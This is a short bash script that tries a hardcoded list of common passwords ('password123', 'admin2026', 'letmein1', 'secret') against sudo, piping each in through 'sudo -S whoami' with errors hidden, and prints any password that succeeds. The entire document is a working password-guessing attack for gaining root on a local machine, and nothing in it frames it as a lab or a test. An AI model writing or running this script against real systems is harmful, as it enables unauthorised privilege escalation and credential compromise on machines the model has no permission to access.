#!/bin/bash

# Define the list of passwords to test
PASSWORDS=("password123" "admin2026" "letmein1" "secret")

# Target command to run if successful
TEST_COMMAND="whoami"

echo "[*] Starting sudo password check..."

for PASS in "${PASSWORDS[@]}"; do
    # Pass the password via stdin using the -S flag
    # Redirect errors to /dev/null to keep the output clean
    OUTPUT=$(echo "$PASS" | sudo -S $TEST_COMMAND 2>/dev/null)
    
    # Check the exit status of the sudo command
    if [ $? -eq 0 ]; then
        echo "[+] Success! Valid password found: $PASS"
        echo "[+] Command output: $OUTPUT"
        exit 0
    else
        echo "[-] Failed: $PASS"
    fi
done

echo "[-] No valid passwords found in the list."
exit 1
